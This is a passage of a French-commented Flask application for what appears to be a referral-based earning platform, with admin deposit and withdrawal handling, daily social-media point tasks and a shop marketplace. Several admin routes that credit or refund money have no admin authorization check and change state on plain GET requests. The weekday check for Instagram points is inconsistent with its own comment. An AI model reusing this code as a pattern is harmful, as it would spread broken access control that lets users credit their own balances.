    # 2. DÉPOTS EN ATTENTE (Filtrage sur les nouveaux utilisateurs)
    subquery = (
        db.session.query(func.max(Depot.id).label("last_id"))
        .join(User, Depot.user_name == User.username)
        .filter(Depot.statut == "en_attente", User.premier_depot == False)
        .group_by(Depot.phone).subquery()
    )

    depots = (
        Depot.query.filter(Depot.id.in_(db.session.query(subquery.c.last_id)))
        .join(User, Depot.user_name == User.username)
        .order_by(Depot.date.desc()).all()
    )

    # 3. RETRAITS (Version corrigée avec jointure)
    retraits_paginated = (
        db.session.query(Retrait, User.username)
        .join(User, Retrait.user_id == User.id)
        .order_by(Retrait.date.desc())
        .paginate(page=page, per_page=PER_PAGE, error_out=False)
    )

    retraits_list = []
    for r, uname in retraits_paginated.items:
        r.username_display = uname
        retraits_list.append(r)

    return render_template(
        "admin_deposits.html",
        user=user,
        users=users_paginated.items,
        depots=depots,
        retraits=retraits_list,
        actifs=actifs,
        inactifs=inactifs,
        total_actifs=total_actifs,
        total_inactifs=total_inactifs,
        users_paginated=users_paginated,
        retraits_paginated=retraits_paginated
    )


@app.route("/admin/deposits/valider/<int:depot_id>")
def valider_depot(depot_id):

    depot = Depot.query.get_or_404(depot_id)

    # User concerné par le dépôt via username
    user = User.query.filter_by(username=depot.user_name).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_deposits"))

    # Si déjà validé
    if depot.statut == "valide":
        flash("Ce dépôt est déjà validé.", "warning")
        return redirect(url_for("admin_deposits"))

    # Vérifier si l'utilisateur n'a jamais eu de dépôt validé avant
    premier_depot_valide = not Depot.query.filter_by(
        user_name=user.username,
        statut="valide"
    ).first()

    # Valider le dépôt
    depot.statut = "valide"

    # Créditer le compte
    user.solde_depot += depot.montant
    user.solde_total += depot.montant

    # Premier dépôt
    if premier_depot_valide:
        user.premier_depot = True

        # Commission parrain
        if user.parrain:
            donner_commission(user.parrain, depot.montant)

    db.session.commit()

    flash("Dépôt validé et crédité avec succès !", "success")
    return redirect(url_for("admin_deposits"))

@app.route("/admin/deposits/rejeter/<int:depot_id>")
def rejeter_depot(depot_id):
    user_admin = get_logged_in_user()

    depot = Depot.query.get_or_404(depot_id)

    if depot.statut in ["valide", "rejete"]:
        flash("Ce dépôt a déjà été traité.", "warning")
        return redirect(url_for("admin_deposits"))

    depot.statut = "rejete"
    db.session.commit()

    flash("Dépôt rejeté avec succès.", "danger")
    return redirect(url_for("admin_deposits"))

@app.route("/admin/retraits")
def admin_retraits():

    user = get_logged_in_admin()
    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    # Récupération avec join
    retraits_query = (
        db.session.query(Retrait, User.username)
        .join(User, User.phone == Retrait.phone)
        .filter(Retrait.statut == "successful")
        .order_by(Retrait.date.desc())
    )

    # Liste finale de retraits avec username_display
    retraits = []
    for retrait, username in retraits_query.all():
        retrait.username_display = username  # pour le template
        retraits.append(retrait)

    return render_template(
        "admin_retraits.html",
        retraits=retraits
    )

@app.route("/admin/retraits/valider/<int:retrait_id>")
def valider_retrait(retrait_id):
    user_admin = get_logged_in_user()

    retrait = Retrait.query.get_or_404(retrait_id)
    user = User.query.filter_by(phone=retrait.phone).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_retraits"))

    if retrait.statut == "validé":
        flash("Ce retrait a déjà été validé.", "info")
        return redirect(url_for("admin_retraits"))

    retrait.statut = "validé"

    # Total retrait
    user.total_retrait += retrait.montant + (retrait.frais or 0)

    db.session.commit()

    flash("Retrait validé avec succès !", "success")
    return redirect(url_for("admin_retraits"))

@app.route("/admin/retraits/refuser/<int:retrait_id>")
def refuser_retrait(retrait_id):
    user_admin = get_logged_in_user()

    retrait = Retrait.query.get_or_404(retrait_id)
    user = User.query.filter_by(phone=retrait.phone).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_retraits"))

    if retrait.statut == "refusé":
        flash("Ce retrait a déjà été refusé.", "info")
        return redirect(url_for("admin_retraits"))

    # Recréditer
    user.solde_parrainage += (retrait.montant + (retrait.frais or 0))
    retrait.statut = "refusé"

    db.session.commit()

    flash("Retrait refusé et montant recrédité à l’utilisateur.", "warning")
    return redirect(url_for("admin_retraits"))

@app.route("/taches/questions-lundi", methods=["GET", "POST"])
def questions_lundi():
    user = get_logged_in_user()  # récupère l'utilisateur connecté

    # Vérifier si aujourd'hui est lundi (0 = lundi)
    if date.today().weekday() != 0:
        return render_template("pas_lundi.html", user=user)

    # Vérifier si l'utilisateur a déjà participé aujourd'hui
    deja_fait = QuestionReponse.query.filter_by(
        user_id=user.id,
        date=date.today()
    ).first()

    if deja_fait:
        return render_template("deja_fait.html", user=user)

    # Sélectionner 5 questions aléatoires
    questions = Question.query.order_by(db.func.random()).limit(5).all()

    if request.method == "POST":
        score = 0
        for q in questions:
            user_answer = request.form.get(f"question_{q.id}", "").strip().lower()
            if user_answer == q.correct_answer.lower():
                score += 5  # Chaque question correcte = 5 points

        # Ajouter les points à l'utilisateur
        user.points += score
        db.session.commit()

        # Enregistrer la tentative dans QuestionReponse
        reponse = QuestionReponse(user_id=user.id, points=score, date=date.today())
        db.session.add(reponse)
        db.session.commit()

        # Préparer le message
        if score == 25:
            message = "Bravo ! Vous avez répondu correctement à toutes les questions et gagné 25 points !"
        else:
            message = f"Vous avez obtenu {score} points sur 25."

        return render_template("resultat_lundi.html", score=score, message=message, user=user)

    return render_template("questions_lundi.html", questions=questions, user=user)


@app.route("/admin/users/activer/<username>")
def admin_activer_user(username):
    admin = get_logged_in_admin()
    if not admin:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    user = User.query.filter_by(username=username).first()
    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_deposits"))

    if user.premier_depot:
        flash("Cet utilisateur est déjà actif.", "warning")
        return redirect(url_for("admin_deposits"))

    # 🔥 Montant d’activation (tu peux changer)
    montant_activation = 0

    # Activer user
    user.premier_depot = True

    # Si tu veux créditer aussi automatiquement
    if montant_activation > 0:
        user.solde_depot += montant_activation
        user.solde_total += montant_activation

        # Créer un dépôt validé (recommandé pour historique)
        depot = Depot(
            user_name=user.username,
            phone=user.phone,
            email=user.email,
            montant=montant_activation,
            statut="valide"
        )
        db.session.add(depot)

        # Commission parrain
        if user.parrain:
            donner_commission(user.parrain, montant_activation)

    db.session.commit()
    flash("Utilisateur activé avec succès !", "success")
    return redirect(url_for("admin_deposits"))


@app.route("/tiktok/complete")
def tiktok_complete():
    user = get_logged_in_user()

    today = datetime.today().weekday()  # mardi = 1
    current_date = datetime.today().strftime("%Y-%m-%d")

    if today != 1:
        return {"status": "error", "message": "La vidéo n’est disponible que le mardi."}

    if user.last_tiktok_date != current_date:
        user.points_tiktok += 20
        user.points_video += 20
        user.points += 20
        user.last_tiktok_date = current_date
        db.session.commit()
        return {"status": "ok", "message": "Points ajoutés"}

    return {"status": "done", "message": "Vous avez déjà obtenu vos points aujourd’hui."}


@app.route("/tiktok")
def tiktok_page():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # mardi = 1
    current_date = datetime.today().strftime("%Y-%m-%d")

    return render_template(
        "tiktok.html",
        user=user,
        today=today,
        current_date=current_date
    )


@app.route("/youtube")
def youtube_page():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # mercredi = 2
    current_date = datetime.today().strftime("%Y-%m-%d")

    return render_template(
        "youtube.html",
        user=user,
        today=today,
        current_date=current_date
    )

@app.route("/youtube/complete")
def youtube_complete():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # mercredi = 2
    current_date = datetime.today().strftime("%Y-%m-%d")

    if today != 2:
        return jsonify({"status": "error", "message": "La vidéo n’est disponible que le mercredi."})

    if user.last_youtube_date != current_date:
        user.points_youtube += 20
        user.points += 20
        user.last_youtube_date = current_date
        db.session.commit()
        return jsonify({"status": "ok", "message": "Points ajoutés"})

    return jsonify({"status": "done", "message": "Vous avez déjà obtenu vos points aujourd’hui."})

@app.route("/instagram")
def instagram_page():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # jeudi = 3
    current_date = datetime.today().strftime("%Y-%m-%d")

    return render_template(
        "instagram.html",
        user=user,
        today=today,
        current_date=current_date
    )

@app.route("/instagram/complete")
def instagram_complete():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # jeudi = 3
    current_date = datetime.today().strftime("%Y-%m-%d")

    if today != 4:
        return jsonify({"status": "error", "message": "La vidéo n’est disponible que le jeudi."})

    if user.last_instagram_date != current_date:
        user.points_instagram += 20
        user.points += 20
        user.last_instagram_date = current_date
        db.session.commit()
        return jsonify({"status": "ok", "message": "Points ajoutés"})

    return jsonify({"status": "done", "message": "Vous avez déjà obtenu vos points aujourd’hui."})

@app.route("/health")
def health():
    return {"status": "ok"}, 200


# ──────────────────────────────────────────────────────
# 🏪 ROUTES POUR LES BOUTIQUES ET VENDEURS
# ──────────────────────────────────────────────────────

# Liste des catégories prédéfinies
CATEGORIES_PREDEFINIES = [
    {"nom": "Mode & Vêtements", "icone": "👕", "description": "Vêtements, chaussures, accessoires de mode"},
    {"nom": "Électronique", "icone": "📱", "description": "Téléphones, ordinateurs, accessoires électroniques"},
    {"nom": "Maison & Jardin", "icone": "🏠", "description": "Décoration, meubles, articles de maison"},
    {"nom": "Beauté & Santé", "icone": "💄", "description": "Cosmétiques, produits de beauté, santé"},
    {"nom": "Sports & Loisirs", "icone": "⚽", "description": "Équipements sportifs, loisirs, plein air"},
    {"nom": "Livres & Médias", "icone": "📚", "description": "Livres, musique, films, jeux vidéo"},
    {"nom": "Alimentation", "icone": "🍔", "description": "Produits alimentaires, boissons, épicerie"},
    {"nom": "Bébé & Enfant", "icone": "👶", "description": "Articles pour bébés et enfants"},
    {"nom": "Animaux", "icone": "🐕", "description": "Accessoires et produits pour animaux"},
    {"nom": "Auto & Moto", "icone": "🚗", "description": "Pièces détachées, accessoires automobiles"},
    {"nom": "Art & Artisanat", "icone": "🎨", "description": "Œuvres d'art, faits main, artisanat"},
    {"nom": "Autre", "icone": "📦", "description": "Autres catégories non listées"},
]


def init_categories():
    """Initialise les catégories par défaut si elles n'existent pas"""
    for cat in CATEGORIES_PREDEFINIES:
        if not Categorie.query.filter_by(nom=cat["nom"]).first():
            nouvelle_cat = Categorie(
                nom=cat["nom"],
                description=cat["description"],
                icone=cat["icone"]
            )
            db.session.add(nouvelle_cat)
    try:
        db.session.commit()
    except:
        db.session.rollback()


@app.route("/api/categories")
def api_categories():
    """Retourne la liste des catégories en JSON"""
    categories = Categorie.query.order_by(Categorie.nom).all()
    return jsonify([{
        "id": c.id,
        "nom": c.nom,
        "description": c.description,
        "icone": c.icone
    } for c in categories])


@app.route("/boutique/creer", methods=["GET", "POST"])
@login_required
def creer_boutique():
    """Page pour créer une nouvelle boutique"""
    user = get_logged_in_user()

    # Vérifier si l'utilisateur a déjà une boutique
    existing_boutique = Boutique.query.filter_by(user_id=user.id, est_actif=True).first()
    if existing_boutique:
        flash("Vous avez déjà une boutique active.", "warning")
        return redirect(url_for("ma_boutique", boutique_id=existing_boutique.id))

    if request.method == "POST":
        nom = request.form.get("nom", "").strip()
        description = request.form.get("description", "").strip()
        email = request.form.get("email", "").strip()
        whatsapp = request.form.get("whatsapp", "").strip()
        adresse = request.form.get("adresse", "").strip()
        ville = request.form.get("ville", "").strip()
        pays = request.form.get("pays", "").strip()
        latitude = request.form.get("latitude", "").strip()
        longitude = request.form.get("longitude", "").strip()

        if not nom:
            flash("Le nom de la boutique est obligatoire.", "danger")
            return render_template("boutique_creer.html", user=user)

        nouvelle_boutique = Boutique(
            user_id=user.id,
            nom=nom,
            description=description,
            email=email,
            whatsapp=whatsapp,
            adresse=adresse,
            ville=ville,
            pays=pays,
            latitude=latitude,
            longitude=longitude
        )

        db.session.add(nouvelle_boutique)
        db.session.commit()

        flash("Boutique créée avec succès ! 🎉", "success")
        return redirect(url_for("ma_boutique", boutique_id=nouvelle_boutique.id))

    return render_template("boutique_creer.html", user=user)


@app.route("/boutique/<int:boutique_id>")
def ma_boutique(boutique_id):
    """Page principale d'une boutique"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    produits = Produit.query.filter_by(boutique_id=boutique_id, est_actif=True).order_by(Produit.date_creation.desc()).all()

    # Calculer la note moyenne
    avis = AvisBoutique.query.filter_by(boutique_id=boutique_id).all()
    note_moyenne = sum(a.note for a in avis) / len(avis) if avis else 0

    return render_template("boutique_view.html",
        boutique=boutique,
        produits=produits,
        note_moyenne=note_moyenne,
        nb_avis=len(avis),
        user=user
    )


@app.route("/boutique/<int:boutique_id>/configurer", methods=["GET", "POST"])
@login_required
def configurer_boutique(boutique_id):
    """Page pour configurer sa boutique"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    if request.method == "POST":
        boutique.nom = request.form.get("nom", "").strip()
        boutique.description = request.form.get("description", "").strip()
        boutique.email = request.form.get("email", "").strip()
        boutique.whatsapp = request.form.get("whatsapp", "").strip()
        boutique.adresse = request.form.get("adresse", "").strip()
        boutique.ville = request.form.get("ville", "").strip()
        boutique.pays = request.form.get("pays", "").strip()
        boutique.latitude = request.form.get("latitude", "").strip()
        boutique.longitude = request.form.get("longitude", "").strip()

        # Gestion du logo
        if "logo" in request.files:
            file = request.files["logo"]
            if file and allowed_file(file.filename):
                filename = secure_filename(f"logo_{boutique.id}_{file.filename}")
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                boutique.logo = f"/{filepath}"

        # Gestion de la bannière
        if "banniere" in request.files:
            file = request.files["banniere"]
            if file and allowed_file(file.filename):
                filename = secure_filename(f"banniere_{boutique.id}_{file.filename}")
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                boutique.banniere = f"/{filepath}"

        db.session.commit()
        flash("Boutique mise à jour avec succès !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("boutique_config.html", boutique=boutique, user=user)


@app.route("/boutique/<int:boutique_id>/produit/ajouter", methods=["GET", "POST"])
@login_required
def ajouter_produit(boutique_id):
    """Page pour ajouter un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    categories = Categorie.query.order_by(Categorie.nom).all()

    if request.method == "POST":
        nom = request.form.get("nom", "").strip()
        description = request.form.get("description", "").strip()
        prix = request.form.get("prix", type=float)
        prix_promo = request.form.get("prix_promo", type=float)
        quantite = request.form.get("quantite", type=int, default=1)
        categorie_id = request.form.get("categorie_id", type=int)
        couleurs = request.form.get("couleurs", "").strip()
        tailles = request.form.get("tailles", "").strip()

        if not nom or not prix:
            flash("Le nom et le prix sont obligatoires.", "danger")
            return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)

        nouveau_produit = Produit(
            boutique_id=boutique.id,
            nom=nom,
            description=description,
            prix=prix,
            prix_promo=prix_promo if prix_promo and prix_promo < prix else None,
            quantite=quantite,
            categorie_id=categorie_id if categorie_id else None,
            couleurs_disponibles=couleurs,
            tailles_disponibles=tailles,
            est_en_promo=prix_promo is not None and prix_promo < prix
        )

        db.session.add(nouveau_produit)
        db.session.commit()

        flash("Produit ajouté avec succès !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)


@app.route("/boutique/<int:boutique_id>/produit/<int:produit_id>/modifier", methods=["GET", "POST"])
@login_required
def modifier_produit(boutique_id, produit_id):
    """Page pour modifier un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    categories = Categorie.query.order_by(Categorie.nom).all()

    if request.method == "POST":
        produit.nom = request.form.get("nom", "").strip()
        produit.description = request.form.get("description", "").strip()
        produit.prix = request.form.get("prix", type=float)
        produit.prix_promo = request.form.get("prix_promo", type=float)
        produit.quantite = request.form.get("quantite", type=int, default=1)
        produit.categorie_id = request.form.get("categorie_id", type=int)
        produit.couleurs_disponibles = request.form.get("couleurs", "").strip()
        produit.tailles_disponibles = request.form.get("tailles", "").strip()
        produit.est_en_promo = produit.prix_promo is not None and produit.prix_promo < produit.prix

        db.session.commit()
        flash("Produit mis à jour avec succès !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("produit_modifier.html", boutique=boutique, produit=produit, categories=categories, user=user)


@app.route("/boutique/<int:boutique_id>/produit/<int:produit_id>/supprimer")
@login_required
def supprimer_produit(boutique_id, produit_id):
    """Supprimer un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    db.session.delete(produit)
    db.session.commit()

    flash("Produit supprimé avec succès.", "success")
    return redirect(url_for("ma_boutique", boutique_id=boutique.id))


@app.route("/produits")
def liste_produits():
    """Page publique pour voir tous les produits"""
    user = get_logged_in_user()
    categorie_id = request.args.get("categorie", type=int)
    recherche = request.args.get("q", "").strip()

    query = Produit.query.filter_by(est_actif=True)

    if categorie_id:
        query = query.filter_by(categorie_id=categorie_id)

    if recherche:
        query = query.filter(
            db.or_(
                Produit.nom.ilike(f"%{recherche}%"),
                Produit.description.ilike(f"%{recherche}%")
            )
        )

    produits = query.order_by(Produit.date_creation.desc()).limit(50).all()
    categories = Categorie.query.order_by(Categorie.nom).all()

    return render_template("produits_liste.html",
        produits=produits,
        categories=categories,
        categorie_actuelle=categorie_id,
        recherche=recherche,
        user=user
    )


@app.route("/produit/<int:produit_id>")
def voir_produit(produit_id):
    """Page détail d'un produit"""
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # Incrémenter le compteur de vues
    produit.vues = (produit.vues or 0) + 1
    db.session.commit()

    return render_template("produit_detail.html", produit=produit, user=user)


@app.route("/boutique/<int:boutique_id>/supprimer")
@login_required
def supprimer_boutique(boutique_id):
    """Supprimer une boutique (désactivation logique)"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    # Désactiver la boutique (soft delete)
    boutique.est_actif = False
    db.session.commit()

    flash("Boutique supprimée avec succès.", "success")
    return redirect(url_for("dashboard_page"))


@app.route("/boutiques")
def liste_boutiques():
    """Page publique pour voir toutes les boutiques"""
    user = get_logged_in_user()
    boutiques = Boutique.query.filter_by(est_actif=True).order_by(Boutique.date_creation.desc()).limit(50).all()

    return render_template("boutiques_liste.html", boutiques=boutiques, user=user)


# Initialiser les catégories au démarrage
with app.app_context():
    try:
        init_categories()
    except:
        pass  # Ignore les erreurs si la table n'existe pas encore


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))  # Render fournit le PORT
    app.run(host="0.0.0.0", port=port, debug=False)
